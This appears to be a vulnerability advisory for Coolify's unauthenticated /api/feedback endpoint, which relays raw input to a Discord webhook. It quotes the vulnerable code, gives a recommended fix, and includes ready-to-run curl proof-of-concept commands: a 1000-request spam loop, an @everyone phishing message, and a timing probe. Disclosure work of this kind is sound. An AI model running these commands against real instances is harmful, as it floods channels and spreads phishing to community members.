repo.description:
## Summary
`POST /api/feedback` has no authentication, no rate limiting, and no input validation. Arbitrary content is forwarded directly to a Discord webhook, enabling spam, content injection, and webhook abuse.

## Details

### Vulnerable Code

**`routes/api.php`, line 29:**
```php
Route::post('/feedback', [OtherController::class, 'feedback']);
// No middleware - completely open to the internet
```

**`app/Http/Controllers/Api/OtherController.php`, lines 148-158:**
```php
public function feedback(Request $request)
{
    $content = $request->input('content');  // No validation, no sanitization
    $webhook_url = config('constants.webhooks.feedback_discord_webhook');
    if ($webhook_url) {
        Http::post($webhook_url, [
            'content' => $content,  // Raw user input sent to Discord
        ]);
    }
    return response()->json(['message' => 'Feedback sent.'], 200);
}
```

### Root Cause
The endpoint is defined outside all middleware groups in `api.php`. There is no `auth:sanctum`, no `throttle`, and no input validation. The `$content` parameter is sent directly to Discord without sanitization.

## PoC

### Prerequisites
- Coolify v4.0.0-beta.468 instance accessible from the internet
- No authentication required

### Steps to Reproduce

#### Scenario 1: Discord Channel Spam (DoS)

```bash
# Send unlimited messages to the project's Discord channel
# No authentication, no rate limiting
for i in $(seq 1 1000); do
  curl -s -X POST 'https://coolify.example.com/api/feedback' \
    -H 'Content-Type: application/json' \
    -d '{"content": "SPAM MESSAGE #'$i' - This channel is being flooded"}' &
done
wait

# Result: 1000 messages sent to Discord in seconds
# Discord webhook rate limit (~30 messages/minute) will be exhausted
# Legitimate feedback will be blocked
```

#### Scenario 2: Discord Content Injection (Phishing)

```bash
# Inject malicious content with Discord markdown formatting
curl -X POST 'https://coolify.example.com/api/feedback' \
  -H 'Content-Type: application/json' \
  -d '{
    "content": "@everyone \n\n**URGENT SECURITY UPDATE** \n\nCoolify has detected a critical vulnerability in your instance. Please update immediately by visiting: https://evil-phishing-site.com/coolify-update \n\nThis is an automated security notification from the Coolify team."
  }'

# Result: Phishing message appears in the official Discord channel
# @everyone mention notifies all channel members
```

#### Scenario 3: Webhook URL Discovery

```bash
# Send a request and observe timing to confirm webhook is configured
time curl -X POST 'https://coolify.example.com/api/feedback' \
  -H 'Content-Type: application/json' \
  -d '{"content": "test"}'

# Slow response (~200ms+) = webhook URL is configured and request was sent
# Fast response (~10ms) = no webhook configured
```

## Impact
**Severity: Medium (CVSS 5.3)**

- **Discord Channel DoS:** Exhaust webhook rate limits, blocking legitimate notifications
- **Content Injection:** Post phishing links, malware URLs, or misleading messages in official channels
- **Reputation Damage:** Attackers can post offensive content appearing to come from the Coolify instance
- **Webhook Enumeration:** Confirm whether a Discord webhook is configured

**Who is affected:**
- All Coolify instances running v4.0.0-beta.468 or earlier with a feedback Discord webhook configured
- The Coolify project's own Discord server (if cloud instances use a shared webhook)

**CWE:** CWE-306 (Missing Authentication for Critical Function), CWE-770 (Allocation of Resources Without Limits)

## Recommended Fix
```php
// Add authentication and rate limiting middleware:
Route::post('/feedback', [OtherController::class, 'feedback'])
    ->middleware(['auth:sanctum', 'throttle:10,1']);

// Add input validation in the controller:
$request->validate([
    'content' => 'required|string|max:1000',
]);
```

## Affected Version
v4.0.0-beta.468 and earlier
